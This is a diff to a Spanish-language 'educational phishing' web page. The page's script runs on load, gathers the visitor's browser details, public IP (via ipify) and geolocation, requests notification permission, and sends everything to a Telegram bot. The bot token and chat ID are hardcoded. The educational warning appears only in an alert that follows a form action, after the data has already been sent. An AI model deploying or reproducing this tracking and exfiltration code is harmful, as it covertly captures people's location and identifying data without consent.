@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Phishing Educativo</title>
+  <title>Phishing Educativo Avanzado</title>
   <style>
     body {
       background-color: #111;
@@ -28,6 +28,7 @@
       color: #f0f;
       margin-bottom: 30px;
       text-shadow: 0 0 5px #f0f;
+      text-align: center;
     }
 
     form {
@@ -52,11 +53,6 @@
       font-weight: bold;
       border: none;
       cursor: pointer;
-      transition: background 0.3s;
-    }
-
-    button:hover {
-      background: #0cc;
     }
 
     @keyframes fadeIn {
@@ -81,64 +77,80 @@
   </form>
 
   <script>
-    // Recolección de datos simulada
-    const datos = {
-      agente: navigator.userAgent,
-      idioma: navigator.language,
-      plataforma: navigator.platform,
-      ancho: screen.width,
-      alto: screen.height,
-      hora: new Date().toLocaleString()
-    };
-
-    // Solicitar permisos de ubicación
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        datos.latitud = position.coords.latitude;
-        datos.longitud = position.coords.longitude;
-      }, function(error) {
-        console.error('Error al obtener la ubicación:', error);
-      });
-    } else {
-      console.log('Geolocalización no soportada por este navegador.');
-    }
-
-    // Solicitar permisos de notificaciones
-    if ('Notification' in window) {
-      Notification.requestPermission().then(permission => {
-        if (permission === 'granted') {
-          datos.notificaciones = 'Permitidas';
-        } else {
-          datos.notificaciones = 'Denegadas';
-        }
-      });
-    } else {
-      datos.notificaciones = 'No soportadas';
-    }
-
-    // Enviar al bot de Telegram
     const ID = "7955801451";
     const TOKEN = "7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI";
-    const mensaje = `
+
+    async function obtenerIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch (e) {
+        return "No disponible";
+      }
+    }
+
+    function solicitarNotificaciones() {
+      if ("Notification" in window) {
+        Notification.requestPermission();
+      }
+    }
+
+    function solicitarUbicacion() {
+      return new Promise((resolve) => {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`);
+            },
+            () => {
+              resolve("Permiso denegado o no disponible");
+            }
+          );
+        } else {
+          resolve("No compatible");
+        }
+      });
+    }
+
+    async function enviarDatos() {
+      const ip = await obtenerIP();
+      const ubicacion = await solicitarUbicacion();
+      solicitarNotificaciones();
+
+      const datos = {
+        agente: navigator.userAgent,
+        idioma: navigator.language,
+        plataforma: navigator.platform,
+        ancho: screen.width,
+        alto: screen.height,
+        hora: new Date().toLocaleString(),
+        ip: ip,
+        ubicacion: ubicacion
+      };
+
+      const mensaje = `
 📡 NUEVA VISITA EDUCATIVA:
-🌐 User-Agent: ${datos.agente}
-🗣️ Idioma: ${datos.idioma}
+🌐 IP: ${datos.ip}
+📍 Ubicación: ${datos.ubicacion}
+🖥️ User-Agent: ${datos.agente}
+🌎 Idioma: ${datos.idioma}
 💻 Plataforma: ${datos.plataforma}
 📏 Resolución: ${datos.ancho}x${datos.alto}
-🕒 Fecha/Hora: ${datos.hora}
-📍 Latitud: ${datos.latitud || 'No disponible'}
-📍 Longitud: ${datos.longitud || 'No disponible'}
-🔔 Notificaciones: ${datos.notificaciones}
-    `;
+🕒 Hora: ${datos.hora}
+      `;
 
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: ID,
-        text: mensaje
-      })
-    });
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: ID,
+          text: mensaje
+        })
+      });
+    }
+
+    enviarDatos();
 
     function mostrarAlerta() {
       alert("⚠️ NO DEBES CAER EN ESTAS COSAS ⚠️\nEsto fue una simulación educativa.");
